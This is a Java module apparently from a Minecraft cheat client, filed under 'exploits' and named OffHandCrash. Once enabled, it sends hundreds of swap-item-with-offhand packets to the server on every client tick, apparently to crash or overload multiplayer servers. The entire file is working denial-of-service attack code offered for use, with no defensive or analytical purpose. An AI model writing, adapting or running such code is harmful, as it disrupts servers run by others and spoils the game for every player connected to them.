package net.como.client.modules.exploits;

import net.como.client.ComoClient;
import net.como.client.events.Event;
import net.como.client.events.client.ClientTickEvent;
import net.como.client.misc.settings.Setting;
import net.como.client.modules.Module;
import net.como.client.utils.ClientUtils;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffHandCrash extends Module {

    public OffHandCrash() {
        super("OffHandCrash");

        this.addSetting(new Setting("Amount", 500));
    }
    
    @Override
    public void activate() {
        this.addListen(ClientTickEvent.class);
    }

    @Override
    public void deactivate() {
        this.removeListen(ClientTickEvent.class);
    }

    private Boolean doPayload() {
        // Make sure that we are in game.
        if (!ClientUtils.inGame()) return false;

        // Get amount
        int amount = this.getIntSetting("Amount");

        // Generate the packet
        PlayerActionC2SPacket packet = new PlayerActionC2SPacket(
            PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND,
            BlockPos.ORIGIN,
            Direction.DOWN
        );

        // Send the packets
        for (int i = 0; i < amount && this.isEnabled(); i++) {
            ComoClient.getClient().getNetworkHandler().sendPacket(packet);
        }

        return true;
    }

    @Override
    public void fireEvent(Event event) {
        switch (event.getClass().getSimpleName()) {
            case "ClientTickEvent": {
                if (!this.doPayload()) this.disable();

                break;
            }
        }
    }
}
